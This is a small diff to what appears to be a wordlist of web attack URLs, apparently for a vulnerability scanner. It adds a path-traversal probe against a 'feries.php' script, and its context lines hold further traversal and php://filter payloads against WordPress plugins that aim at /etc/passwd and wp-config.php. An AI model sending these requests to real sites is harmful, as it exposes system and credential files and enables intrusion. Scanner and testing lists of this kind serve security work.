@@ -32,3 +32,4 @@
 /wp-content/plugins/gboutique/library/dompdf/dompdf.php?input_file=php://filter/resource=/etc/passwd
 /wp-content/plugins/wp-ecommerce-shop-styling/includes/dompdf/dompdf.php?input_file=php://filter/resource=/etc/passwd
 /wp-content/plugins/db-backup/download.php?file=../../../wp-config.php
+/process/feries.php?fichier=../../../../../../../etc/passwd
